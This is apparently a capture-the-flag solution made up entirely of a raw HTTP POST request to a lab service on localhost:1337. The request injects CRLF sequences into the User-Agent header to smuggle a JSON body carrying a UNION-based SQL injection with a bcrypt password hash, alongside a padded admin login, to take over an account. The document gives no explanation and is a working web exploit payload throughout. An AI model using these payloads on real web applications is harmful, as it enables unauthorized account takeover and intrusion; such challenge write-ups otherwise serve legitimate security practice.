## Solution

```
POST /user HTTP/1.1

Host: localhost:1337

User-Agent: Mozilla/7.0%0d%0a%0d%0a{"username":"' UNION SELECT 2, 'user', '$2y$10$Aon1iQ3nnof.VPIsOzuGEeT1fTZn/FEVRyarkKINPtCagLEfsOPlG'-- -","password":"password"}

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Referer: http://localhost:1337/

Content-Type: application/x-www-form-urlencoded

Content-Length: 141

Origin: http://localhost:1337

Connection: close

Cookie: zmSkin=classic; zmCSS=base; zmLogsTable.bs.table.pageNumber=1; zmMontageLayout=3; zmMontageScale=; zmHeaderFlip=up; zmLogsTable.bs.table.searchText=.log; connect.sid=s%3A5WpiiY20l8kcMwtuzNkH7BBIlCq_a6jA.YeFnFZXGNHN1LobapFHZU%2F%2FfNIST4DfLaadMw8jSIXQ

Sec-Fetch-Dest: empty

Sec-Fetch-Mode: cors

Sec-Fetch-Site: same-origin



username=adminaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&password=admin
```